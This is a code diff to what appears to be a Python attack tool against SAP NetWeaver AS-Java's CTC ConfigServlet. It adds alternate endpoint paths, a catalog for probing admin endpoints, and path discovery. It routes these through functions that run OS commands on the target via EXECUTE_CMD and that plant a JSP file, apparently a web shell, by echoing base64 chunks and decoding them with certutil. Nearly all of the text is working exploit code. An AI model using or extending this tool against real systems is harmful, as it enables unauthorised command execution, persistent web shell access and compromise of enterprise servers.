@@ -44,11 +44,12 @@ _CTC_PATH = "/ctc/ConfigServlet"
 _CONFIG_CLASS = "com.sap.ctc.util.FileSystemConfig"
 
 
-def _build_url(host: str, port: int, use_https: bool) -> str:
+def _build_url(host: str, port: int, use_https: bool,
+                 path: str = _CTC_PATH) -> str:
     scheme = "https" if use_https else "http"
     if ":" in host and not host.startswith("["):
         host = f"[{host}]"
-    return f"{scheme}://{host}:{port}{_CTC_PATH}"
+    return f"{scheme}://{host}:{port}{path}"
 
 
 def _auth_header(user: str, pwd: str) -> str:
@@ -80,22 +81,131 @@ def _http_get(url: str, user: str, pwd: str, timeout: float) -> tuple:
 # Probes / command execution
 # ---------------------------------------------------------------------------
 
+# Alternate paths for the same FileSystemConfig entry point.  Different
+# AS-Java releases and hardening profiles ship different subsets.
+_CTC_ALT_PATHS = (
+    "/ctc/ConfigServlet",
+    "/ctc/CTCWebServiceImpl",
+    "/CTCWebServiceImpl",
+    "/ctc/servlet/ConfigServlet",
+    "/ctc/config/ConfigServlet",
+)
+
+# Common admin-auth HTTP endpoints, used by the diagnostic probe below
+# to help the operator pick a viable pivot when ConfigServlet is gone.
+_ADMIN_ENDPOINT_CATALOG = (
+    ("/useradmin/",                               "UME Admin UI"),
+    ("/nwa/",                                     "NetWeaver Administrator"),
+    ("/logviewer/",                               "Log Viewer"),
+    ("/monitoring/",                              "Monitoring Servlet"),
+    ("/sap/monitoring/SystemInfo",                "SystemInfo"),
+    ("/jmx/",                                     "JMX Console"),
+    ("/ctc/ConfigServlet",                        "CTC ConfigServlet"),
+    ("/ctc/CTCWebServiceImpl",                    "CTC Web Service Impl"),
+    ("/CTCWebService/CTCWebServiceBean",          "CTC Web Service (RECON)"),
+    ("/webdynpro/resources/sap.com/tc~lm~webadmin~mainframe~wd/MainFrame",
+        "LM Web Admin MainFrame"),
+    ("/webdynpro/resources/sap.com/tc~lm~ctc~deploy~wd/Main",
+        "LM CTC Deploy WD App"),
+    ("/webdynpro/dispatcher/sap.com/tc~lm~itsam~ui~mainframe~wd/Shell",
+        "NWA Shell WD"),
+    ("/XIMonitor/",                               "PI Integration Monitor"),
+    ("/mdt/",                                     "Message Directory Tool"),
+    ("/rwb/",                                     "Runtime Workbench"),
+    ("/bugrep/",                                  "Bug Report Tool"),
+    ("/sldc/",                                    "SLD Central"),
+)
+
+
+def discover_ctc_path(host: str, port: int, user: str, pwd: str,
+                         use_https: bool = False,
+                         timeout: float = 6.0) -> str:
+    """Return the first `_CTC_ALT_PATHS` that responds with something
+    other than 404 (either authenticated 200 or 401/403), otherwise "".
+    """
+    ctx = ssl._create_unverified_context()
+    for path in _CTC_ALT_PATHS:
+        scheme = "https" if use_https else "http"
+        url = f"{scheme}://{host}:{port}{path}"
+        req = urllib.request.Request(url, headers={
+            "User-Agent": _UA,
+            "Authorization": _auth_header(user, pwd),
+        })
+        try:
+            with urllib.request.urlopen(req, timeout=timeout,
+                                           context=ctx) as r:
+                if r.status != 404:
+                    return path
+        except urllib.error.HTTPError as e:
+            if e.code != 404:
+                return path
+        except Exception:
+            continue
+    return ""
+
+
+def probe_admin_endpoints(host: str, port: int, user: str, pwd: str,
+                              use_https: bool = False,
+                              timeout: float = 4.0) -> list:
+    """Diagnostic: HEAD a catalog of common Java admin endpoints with
+    HTTP Basic + report which are present.
+
+    Returns a list of dicts: {path, desc, status, marker}
+    where marker is one of "OK", "AUTH-REJECTED", "FORBIDDEN", "MISSING",
+    or "UNREACHABLE".
+    """
+    ctx = ssl._create_unverified_context()
+    out = []
+    scheme = "https" if use_https else "http"
+    base = f"{scheme}://{host}:{port}"
+    for path, desc in _ADMIN_ENDPOINT_CATALOG:
+        req = urllib.request.Request(base + path, method="HEAD",
+                                       headers={"User-Agent": _UA,
+                                                "Authorization":
+                                                _auth_header(user, pwd)})
+        try:
+            with urllib.request.urlopen(req, timeout=timeout,
+                                           context=ctx) as r:
+                status = r.status
+        except urllib.error.HTTPError as e:
+            status = e.code
+        except Exception:
+            out.append({"path": path, "desc": desc,
+                        "status": 0, "marker": "UNREACHABLE"})
+            continue
+        if status == 404:
+            marker = "MISSING"
+        elif status in (401,):
+            marker = "AUTH-REJECTED"
+        elif status in (403,):
+            marker = "FORBIDDEN"
+        elif status < 400:
+            marker = "OK"
+        else:
+            marker = f"HTTP-{status}"
+        out.append({"path": path, "desc": desc,
+                    "status": status, "marker": marker})
+    return out
+
+
 def probe(host: str, port: int, user: str, pwd: str,
-            use_https: bool = False, timeout: float = 10.0) -> dict:
-    """Check whether /ctc/ConfigServlet is present and accepts our creds.
+            use_https: bool = False, timeout: float = 10.0,
+            ctc_path: str = _CTC_PATH) -> dict:
+    """Check whether the ConfigServlet is present and accepts our creds.
 
     We run a harmless ``EXECUTE_CMD`` with a no-op command that echoes
     a random token, and look for the token in the response body.
     """
     result = {"reachable": False, "authenticated": False,
               "http_status": 0, "evidence": "",
-              "url": _build_url(host, port, use_https)}
+              "url": _build_url(host, port, use_https, ctc_path)}
 
     token = "sapmap_" + "".join(random.choice(string.ascii_lowercase)
                                    for _ in range(8))
     cmd = _osexec_wrapper(f"echo {token}", os_type="windows")
     r = execute_cmd(host, port, user, pwd, cmd,
-                     use_https=use_https, timeout=timeout, raw=True)
+                     use_https=use_https, timeout=timeout, raw=True,
+                     ctc_path=ctc_path)
     result["http_status"] = r.get("http_status", 0)
 
     if r.get("http_status") == 0:
@@ -125,7 +235,8 @@ def probe(host: str, port: int, user: str, pwd: str,
 def execute_cmd(host: str, port: int, user: str, pwd: str,
                   cmd: str, *,
                   use_https: bool = False, timeout: float = 30.0,
-                  raw: bool = False) -> dict:
+                  raw: bool = False,
+                  ctc_path: str = _CTC_PATH) -> dict:
     """Run an OS command on the target via FileSystemConfig;EXECUTE_CMD.
 
     Args:
@@ -145,7 +256,7 @@ def execute_cmd(host: str, port: int, user: str, pwd: str,
     # remote shell decode — see _osexec_wrapper.
     param = (f"{_CONFIG_CLASS};EXECUTE_CMD;"
              f"CMDLINE={urllib.parse.quote(cmd, safe='')}")
-    url = (_build_url(host, port, use_https)
+    url = (_build_url(host, port, use_https, ctc_path)
            + "?param=" + urllib.parse.quote(param, safe=";=/"))
     result["url"] = url
 
@@ -193,14 +304,39 @@ def deploy_jsp_via_ctc(host: str, port: int, user: str, pwd: str,
                          timeout: float = 60.0, log=print) -> dict:
     """Write a JSP to ``target_path`` on the target by chunk-echoing
     base64 into a temp file, then certutil / base64 -decoding into
-    place.  Uses /ctc/ConfigServlet EXECUTE_CMD with HTTP Basic auth.
+    place.  Uses the ConfigServlet EXECUTE_CMD endpoint with HTTP Basic.
     """
     result = {"success": False, "method": "", "bytes_written": 0,
               "error": ""}
 
-    # Step 1 — verify ConfigServlet is alive + authenticates.
-    log(f"[*] ctc: probing {_build_url(host, port, use_https)} as {user!r}")
-    p = probe(host, port, user, pwd, use_https=use_https, timeout=10)
+    # Step 1 — locate a ConfigServlet-style endpoint.  Primary path
+    # /ctc/ConfigServlet is the 2012-era default; newer hardening
+    # profiles move or remove it.
+    log(f"[*] ctc: discovering ConfigServlet path on "
+        f"{host}:{port} (as {user!r}) …")
+    found_path = discover_ctc_path(host, port, user, pwd,
+                                      use_https=use_https, timeout=6.0)
+    if not found_path:
+        log(f"[-] ctc: no ConfigServlet path responded "
+            f"(tried: {', '.join(_CTC_ALT_PATHS)})")
+        # Run the diagnostic probe so the operator can see what's there.
+        log(f"[*] ctc: probing other admin endpoints for visibility …")
+        for row in probe_admin_endpoints(host, port, user, pwd,
+                                             use_https=use_https):
+            log(f"[·] ctc: {row['marker']:<14} "
+                f"HTTP {row['status']:>3}  {row['path']}  "
+                f"({row['desc']})")
+        result["error"] = ("no ConfigServlet endpoint present — system "
+                            "looks hardened or minimised.  See the "
+                            "admin-endpoint probe above to choose a "
+                            "manual pivot; /nwa/deploy_and_change is "
+                            "the usual fallback when it exists.")
+        return result
+    log(f"[+] ctc: using endpoint {found_path}")
+
+    # Step 2 — verify the endpoint actually executes EXECUTE_CMD.
+    p = probe(host, port, user, pwd, use_https=use_https, timeout=10,
+                 ctc_path=found_path)
     if not p.get("authenticated"):
         result["error"] = f"ctc probe failed: {p.get('evidence', '?')}"
         log(f"[-] ctc: {result['error']}")
@@ -230,13 +366,15 @@ def deploy_jsp_via_ctc(host: str, port: int, user: str, pwd: str,
 
     # Clear any stale tmp
     execute_cmd(host, port, user, pwd, cleanup,
-                  use_https=use_https, timeout=timeout)
+                  use_https=use_https, timeout=timeout,
+                  ctc_path=found_path)
 
     progress_every = max(1, len(chunks) // 5)
     for idx, chunk in enumerate(chunks):
         op = ">" if idx == 0 else ">>"
         r = execute_cmd(host, port, user, pwd, echo(chunk, op),
-                          use_https=use_https, timeout=timeout)
+                          use_https=use_https, timeout=timeout,
+                          ctc_path=found_path)
         if not r.get("success"):
             result["error"] = (f"chunk {idx + 1}/{len(chunks)} failed: "
                                f"{r.get('error', '?')}")
@@ -247,17 +385,19 @@ def deploy_jsp_via_ctc(host: str, port: int, user: str, pwd: str,
 
     log(f"[*] ctc: decoding {tmp_path} → {target_path}")
     dec = execute_cmd(host, port, user, pwd, decode,
-                        use_https=use_https, timeout=timeout)
+                        use_https=use_https, timeout=timeout,
+                        ctc_path=found_path)
     if not dec.get("success"):
         result["error"] = f"decode step failed: {dec.get('error', '?')}"
         log(f"[-] ctc: {result['error']}")
         return result
     # Run cleanup but don't fail if it errors
     execute_cmd(host, port, user, pwd, cleanup,
-                  use_https=use_https, timeout=timeout)
+                  use_https=use_https, timeout=timeout,
+                  ctc_path=found_path)
 
     result["success"] = True
-    result["method"] = "ctc.EXECUTE_CMD"
+    result["method"] = f"ctc.EXECUTE_CMD[{found_path}]"
     result["bytes_written"] = len(jsp_bytes)
     log(f"[+] ctc: {len(jsp_bytes)} bytes written to {target_path}")
     return result
